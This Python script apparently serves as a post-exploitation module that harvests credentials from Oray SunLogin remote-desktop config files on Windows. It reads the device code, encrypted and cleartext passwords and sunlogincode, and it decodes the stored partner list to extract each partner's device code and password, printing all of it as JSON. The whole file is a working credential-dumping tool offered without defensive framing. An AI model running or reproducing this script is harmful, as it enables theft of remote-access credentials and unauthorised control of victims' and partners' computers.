# -*- coding: utf-8 -*-
import base64
import json
import os
import re


# 系统函数,为了获取输入参数
def get_script_param(key):
    input_str = 'eyJpbnB1dF9jb25maWdfcGF0aCI6ICJDOlxcUHJvZ3JhbSBGaWxlc1xcT3JheVxcU3VuTG9naW5cXFN1bmxvZ2luQ2xpZW50XFxjb25maWctbmV3LmluaSJ9'
    try:
        dict_params = json.loads(base64.b64decode(input_str))
        return dict_params.get(key)
    except Exception as E:
        return None


def SunLogin():
    SunLogin_path = ["C:\Program Files\Oray\SunLogin\SunloginClient\config.ini",
                     "C:\ProgramData\Oray\SunloginClient\config.ini",
                     ]
    if get_script_param('input_config_path') is not None:
        SunLogin_path.append(get_script_param('input_config_path'))

    return_data = []
    for x in SunLogin_path:
        if os.path.exists(x):
            one_config = {"localuser": "", "localpassword": "", "clearpassword": "", "sunlogincode": "", "partner": []}

            with open(x, "r") as f:
                data = f.read()
                f.close()
                if "fastcode" in data:
                    try:
                        fastcode = re.findall("fastcode=(.*)", data)
                        one_config["localuser"] = fastcode[0]
                    except Exception as E:
                        one_config["localuser"] = ""

                    try:
                        encry_pwd = re.findall("encry_pwd=(.*)", data)
                        password = encry_pwd[0]
                        one_config["localpassword"] = password
                    except Exception as E:
                        one_config["localpassword"] = ""

                    try:
                        clear_pwd = re.findall("password=(.*)", data)
                        clear_password = clear_pwd[0]
                        one_config["clearpassword"] = clear_password
                    except Exception as E:
                        one_config["clearpassword"] = ""

                try:
                    sunlogincodestr = re.findall("sunlogincode=(.*)", data)
                    sunlogincode = sunlogincodestr[0]
                    one_config["sunlogincode"] = sunlogincode
                except Exception as E:
                    one_config["sunlogincode"] = ""

                try:
                    sunjson = re.findall("json=(.*)", data)
                    sunjson = sunjson[0]
                    b64sunjson = base64.b64decode(sunjson).decode("utf-8")
                    b64sunjson = json.loads(b64sunjson)
                    partner = []
                    for i in b64sunjson:
                        fastcode_1 = i['fastcode']
                        password = i['password']
                        partner.append({"fastcode": fastcode_1, "password": password})
                    one_config["partner"] = partner
                except Exception as E:
                    one_config["partner"] = []

            return_data.append(one_config)
    return return_data


return_data = SunLogin()
print(json.dumps(return_data))